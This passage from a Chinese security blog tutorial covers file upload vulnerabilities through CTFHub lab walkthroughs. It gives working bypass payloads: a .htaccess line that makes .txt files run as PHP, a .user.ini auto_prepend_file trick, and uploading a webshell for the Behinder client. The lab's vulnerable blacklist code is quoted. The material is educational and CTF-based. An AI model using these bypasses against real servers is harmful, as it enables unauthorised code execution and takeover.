@@ -1,0 +1,1105 @@
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>文件上传漏洞 - Wells's Blog</title>
+
+  
+    <meta name="description" content="概述什么是文件上传漏洞文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件并进行执行，后获得执行服务端命令的能力。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 产生文件上传漏洞的原因 不充分的文件验证：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。 不安全的文件存储：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="https://wells.host/posts/931c692/">
+<meta property="og:site_name" content="Wells&#39;s Blog">
+<meta property="og:description" content="概述什么是文件上传漏洞文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件并进行执行，后获得执行服务端命令的能力。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 产生文件上传漏洞的原因 不充分的文件验证：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。 不安全的文件存储：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wells.host/img/avatar.jpg">
+<meta property="article:published_time" content="2024-03-01T12:33:11.000Z">
+<meta property="article:modified_time" content="2025-08-05T09:16:33.172Z">
+<meta property="article:author" content="Wells">
+<meta property="article:tag" content="CTF-Web">
+<meta property="article:tag" content="Web-FileUpload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wells.host/img/avatar.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF-Web,Web-FileUpload">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Wells's Blog" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/img/favicon.ico">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Wells","sameAs":[],"image":"/img/avatar.jpg"},"dateCreated":"2024-03-01T20:33:11+08:00","dateModified":"2025-08-05T17:16:33+08:00","datePublished":"2024-03-01T20:33:11+08:00","description":"","headline":"文件上传漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"https://wells.host/posts/931c692/"},"publisher":{"@type":"Organization","name":"Wells","sameAs":[],"image":"/img/avatar.jpg","logo":{"@type":"ImageObject","url":"/img/avatar.jpg"}},"url":"https://wells.host/posts/931c692/","keywords":"CTF-Web, Web-FileUpload","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Wells's Blog</div><div class="sub cap">Learning Cyber Security...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 20.536C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535" opacity="0.5"/><path fill="currentColor" d="M9.5 8.75A3.25 3.25 0 1 0 12.75 12a.75.75 0 0 1 1.5 0A4.75 4.75 0 1 1 9.5 7.25a.75.75 0 0 1 0 1.5"/><path fill="currentColor" d="M17.75 12a3.25 3.25 0 0 1-3.25 3.25a.75.75 0 0 0 0 1.5A4.75 4.75 0 1 0 9.75 12a.75.75 0 0 0 1.5 0a3.25 3.25 0 0 1 6.5 0"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper markdown"><div class="widget-header dis-select"><span class="name">无限进步<<<</span></div><div class="widget-body fs14"><p>少年应有鸿鹄志，当骑骏马踏平川</p>
+</div></widget>
+
+<widget class="widget-wrapper linklist"><div class="widget-body fs14">
+<div class="linklist left" style="grid-template-columns:repeat(1,1fr);">
+<a class="link" title="Web安全" href="/categories/web"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M3.378 5.082C3 5.62 3 7.22 3 10.417v1.574c0 5.638 4.239 8.375 6.899 9.536c.721.315 1.082.473 2.101.473c1.02 0 1.38-.158 2.101-.473C16.761 20.365 21 17.63 21 11.991v-1.574c0-3.198 0-4.797-.378-5.335c-.377-.537-1.88-1.052-4.887-2.081l-.573-.196C13.595 2.268 12.812 2 12 2s-1.595.268-3.162.805L8.265 3c-3.007 1.03-4.51 1.545-4.887 2.082" opacity="0.5"/><path fill="currentColor" fill-rule="evenodd" d="M6.688 9.8a5.75 5.75 0 1 0 10.625 4.4A5.75 5.75 0 0 0 6.688 9.8m5.256-2.032A.1.1 0 0 1 12 7.75c.004 0 .021 0 .056.018a.7.7 0 0 1 .17.134c.153.158.328.431.492.841c.162.404.296.901.39 1.466q.083.502.118 1.041h-2.452q.035-.539.118-1.04a7 7 0 0 1 .39-1.467c.164-.41.34-.683.492-.841a.7.7 0 0 1 .17-.134M9.412 9.964c-.068.415-.116.847-.14 1.286H7.816a4.25 4.25 0 0 1 2.01-2.903a9 9 0 0 0-.415 1.617M7.817 12.75H9.27c.025.439.073.871.141 1.286a9 9 0 0 0 .415 1.617a4.25 4.25 0 0 1-2.01-2.903m8.366-1.5a4.25 4.25 0 0 0-2.01-2.903c.18.486.318 1.034.415 1.617c.068.415.116.847.14 1.286zm-1.454 1.5h1.454a4.25 4.25 0 0 1-2.01 2.903c.18-.486.318-1.034.415-1.617c.068-.415.116-.847.14-1.286m-1.503 0a11 11 0 0 1-.118 1.04a7 7 0 0 1-.39 1.467c-.164.41-.34.683-.492.841a.7.7 0 0 1-.17.134a.1.1 0 0 1-.056.018c-.004 0-.021 0-.056-.018a.7.7 0 0 1-.17-.134c-.153-.158-.328-.431-.492-.841a7 7 0 0 1-.39-1.466a11 11 0 0 1-.118-1.041z" clip-rule="evenodd"/></svg><span>Web安全</span></div></a>
+<a class="link" title="渗透测试" href="/categories/penetration"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M14 21.71A7 7 0 0 1 5 15v-3.062A3.94 3.94 0 0 1 8.938 8h6.124A3.94 3.94 0 0 1 19 11.938V15a6.98 6.98 0 0 1-2 4.899"/><path fill="currentColor" d="M8.25 7.5a.75.75 0 0 0-1.5 0zm-.615-2.917a.75.75 0 1 0 1.246.834zM17.25 8.5v-1h-1.5v1zm-10.5-1v1h1.5v-1zm10.5 0c0-2.9-2.35-5.25-5.25-5.25v1.5a3.75 3.75 0 0 1 3.75 3.75zM12 2.25a5.25 5.25 0 0 0-4.365 2.333l1.246.834A3.75 3.75 0 0 1 12 3.75z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M19 14h3M5 14H2M14.5 3.5L17 2M9.5 3.5L7 2m13.5 18l-2-.8m2-11.2l-2 .8M3.5 20l2-.8M3.5 8l2 .8M12 21.5V15"/></g></svg><span>渗透测试</span></div></a>
+<a class="link" title="代码审计" href="/categories/code-audit"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path d="m17 7.83l1.697 1.526c1.542 1.389 2.313 2.083 2.313 2.974c0 .89-.771 1.585-2.314 2.973L17 16.83"/><path d="m13.987 5l-3.974 14.83" opacity="0.5"/><path d="M7 7.83L5.304 9.356C3.76 10.745 2.99 11.44 2.99 12.33s.771 1.585 2.314 2.973L7 16.83"/></g></svg><span>代码审计</span></div></a>
+<a class="link" title="电子取证" href="/categories/forensics"><div class="flex"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M10 20h3.627a5.25 5.25 0 1 1 8.369-6.34Q22 12.9 22 12c0-.442 0-1.608-.002-2H2.002C2 10.392 2 11.558 2 12c0 3.771 0 5.657 1.172 6.828S6.229 20 10 20" opacity="0.5"/><path fill="currentColor" d="M5.25 16a.75.75 0 0 1 .75-.75h4a.75.75 0 0 1 0 1.5H6a.75.75 0 0 1-.75-.75"/><path fill="currentColor" fill-rule="evenodd" d="M17.75 14.5a2.25 2.25 0 1 0 0 4.5a2.25 2.25 0 0 0 0-4.5M14 16.75a3.75 3.75 0 1 1 6.879 2.068l.901.902a.75.75 0 1 1-1.06 1.06l-.902-.901A3.75 3.75 0 0 1 14 16.75" clip-rule="evenodd"/><path fill="currentColor" d="M9.995 4h4.01c3.781 0 5.672 0 6.846 1.116c.846.803 1.083 1.96 1.149 3.884v1H2V9c.066-1.925.303-3.08 1.149-3.884C4.323 4 6.214 4 9.995 4"/></svg><span>电子取证</span></div></a>
+<a class="link" title="工具手册" href="/categories/tools"><div class="flex"><?xml version="1.0" encoding="UTF-8"?><svg width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M44 16C44 22.6274 38.6274 28 32 28C29.9733 28 28.0639 27.4975 26.3896 26.6104L9 44L4 39L21.3896 21.6104C20.5025 19.9361 20 18.0267 20 16C20 9.37258 25.3726 4 32 4C34.0267 4 35.9361 4.50245 37.6104 5.38959L30 13L35 18L42.6104 10.3896C43.4975 12.0639 44 13.9733 44 16Z" fill="none" stroke="#333" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><span>工具手册</span></div></a></div></div></widget>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/posts/5ae37a88/"><span class="title">数据库提权中的字符集挑战</span></a><a class="item title" href="/posts/72baa392/"><span class="title">Yakit插件开发</span></a><a class="item title" href="/posts/b1f1aefc/"><span class="title">常见协议与PHP伪协议</span></a><a class="item title" href="/posts/e85eefb/"><span class="title">SQL Server下SQL注入的应用</span></a><a class="item title" href="/posts/e73517db/"><span class="title">SQL注入</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/we11s" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="/about/#comments" rel="noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/942ebbf1a4b91.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web/">web</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-01T12:33:11.000Z">2024-03-01</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-08-05T09:16:33.172Z">2025-08-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>文件上传漏洞</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><p>文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以<strong>向服务器上传恶意文件并进行执行</strong>，后获得<strong>执行服务端命令的能力</strong>。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p>
+<h2 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h2><ul>
+<li><strong>不充分的文件验证</strong>：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。</li>
+<li><strong>不安全的文件存储</strong>：如果上传的文件存储在可通过Web直接访问的位置，且文件名可预测或未经过适当处理，攻击者可能会执行上传的恶意文件。</li>
+<li><strong>未对权限进行限制</strong>：权限上没有对于上传的文件目录设置不可执行权限。</li>
+</ul>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><strong>CTFHUB-技能树-WEB-文件上传-无验证</strong></p>
+<p>因为在上传文件后无验证文件信息以及设置动态脚本不可被执行，因此便可直接上传远程木马文件，</p>
+<p><img src="/posts/931c692/image-20240305194710871.png" alt="image-20240305194710871"></p>
+<p>上传后访问此网站路径下的<code>/upload/shell.php</code>发现是空白界面，说明<strong>php文件可以被执行</strong>，此时通过冰蝎进行远程连接</p>
+<p><img src="/posts/931c692/image-20240305194939723.png" alt="image-20240305194939723"></p>
+<p>出现phpinfo页面，说明连接成功，即可获得主机部分权限，转到对应目录读取<code>flag</code></p>
+<p><img src="/posts/931c692/image-20240305195139075.png" alt="image-20240305195139075"></p>
+<h1 id="后端绕过-解析漏洞"><a href="#后端绕过-解析漏洞" class="headerlink" title="后端绕过-解析漏洞"></a>后端绕过-解析漏洞</h1><blockquote>
+<p>解析漏洞通常指的是当应用程序或服务器在处理上传文件时，由于对文件类型的解析不当或不安全，导致攻击者能够上传恶意文件，从而执行不当操作或获取不当权限的安全问题。例如允许用户上传<code>.htaccess</code>文件导致用户可以设置任意文件格式的解析方式</p>
+</blockquote>
+<h2 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h2><h3 id="htaccess简介"><a href="#htaccess简介" class="headerlink" title=".htaccess简介"></a>.htaccess简介</h3><p><code>.htaccess</code>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过<code>.htaccess</code>可以做到：重写<strong>解析规则</strong>(如：将<code>png</code>文件作为<code>php</code>来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。</p>
+<h3 id="htaccess的作用范围"><a href="#htaccess的作用范围" class="headerlink" title=".htaccess的作用范围"></a>.htaccess的作用范围</h3><p><code>.htaccess</code>的生效范围为<code>.htaccess</code>文件所在的当前目录。</p>
+<h3 id="htaccess利用前提"><a href="#htaccess利用前提" class="headerlink" title=".htaccess利用前提"></a>.htaccess利用前提</h3><ul>
+<li>使用<code>Apache</code> 服务器（ 不适用于<code>Nginx</code> 服务器）</li>
+<li>能成功上传<code>.htaccess</code>文件的上传，且没有被重命名</li>
+</ul>
+<h3 id="htaccess使用模板"><a href="#htaccess使用模板" class="headerlink" title=".htaccess使用模板"></a>.htaccess使用模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#对于php</span><br><span class="line">AddHandler application/x-httpd-php .html #将html文件作为php文件进行解析</span><br></pre></td></tr></table></figure>
+
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-.htaccess</strong></p>
+<p>查看页面源码可以发现页面后端源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CTFHub 文件上传 - htaccess&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CTFHub 文件上传 - htaccess&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;br /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $ext = pathinfo($name)[&#x27;extension&#x27;];</span><br><span class="line">    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span><br><span class="line">    if (!in_array($ext, $blacklist)) &#123;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>$blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</code>发现大多数的动态执行脚本文件后缀被禁止，但发现<code>.htaccess</code>并没有被禁止，此时可以上传文件<code>.htaccess</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure>
+
+<p>再上传含有shell的php代码的<code>txt</code>文件，上传成功后，访问<code>upload/shell.php.txt</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p>
+<p><img src="/posts/931c692/image-20240305203044058.png"></p>
+<p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p>
+<h2 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h2><h3 id="user-ini介绍"><a href="#user-ini介绍" class="headerlink" title=".user.ini介绍"></a>.user.ini介绍</h3><p><code>php.ini</code>是php的一个<strong>全局配置</strong>文件，<strong>对整个web服务起作用</strong>；而<code>.user.ini</code>与<code>.htaccess</code>类似，设置当前目录的配置信息。</p>
+<p>详细参考信息：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">PHP: .user.ini 文件 - Manual</a>、<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000011552335">php - 神秘的.user.ini文件</a></p>
+<p>其中<code>php</code> 配置项中有两个配置可以起到文件包含的作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //将指定文件包含在该目录中所有php脚本的文件头部</span><br><span class="line">auto_append_file = &lt;filename&gt;          //将指定文件包含在该目录中所有php脚本的文件尾部</span><br></pre></td></tr></table></figure>
+
+<h3 id="user-ini使用前提"><a href="#user-ini使用前提" class="headerlink" title=".user.ini使用前提"></a>.user.ini使用前提</h3><ul>
+<li>能成功上传<code>.user.ini</code>文件的上传，且没有被重命名</li>
+<li>此目录下已有一个任意的<code>.php</code>文件</li>
+</ul>
+<h3 id="user-ini作用范围"><a href="#user-ini作用范围" class="headerlink" title=".user.ini作用范围"></a>.user.ini作用范围</h3><p>与<code>.htaccess</code>文件相同，<code>.user.ini</code>的生效范围为<code>.user.ini</code>文件所在的当前目录。</p>
+<h3 id="user-ini使用方法"><a href="#user-ini使用方法" class="headerlink" title=".user.ini使用方法"></a>.user.ini使用方法</h3><p>1.首先上传一个含有<code>php</code>代码的任意符合后端检测的文件，以<code>.jpg</code>为例：</p>
+<p>文件名为<code>info.jpg</code>,内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.载上传入<code>.user.ini</code>文件，内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = info.jpg   </span><br></pre></td></tr></table></figure>
+
+<p>注：<code>info.jpg</code>需要自己上传问文件名来确定</p>
+<p>3.访问文件上传目录下的任意<code>.php</code>文件即可</p>
+<h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><h2 id="数字后缀绕过"><a href="#数字后缀绕过" class="headerlink" title="数字后缀绕过"></a>数字后缀绕过</h2><h3 id="数字后缀简介"><a href="#数字后缀简介" class="headerlink" title="数字后缀简介"></a>数字后缀简介</h3><p>PHP 文件的标准后缀始终是 <code>.php</code>，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者&#x2F;系统中，使用<code>.php3</code> 、<code>.php5</code> 、<code>.php7</code> 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置<code>.php7</code> 等后缀可被PHP解释器解析</p>
+<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>Apache 的配置文件或目录下的<code>.htaccess</code> 文件有添加设置，如<code>.php7</code>可被解析的配置为：</p>
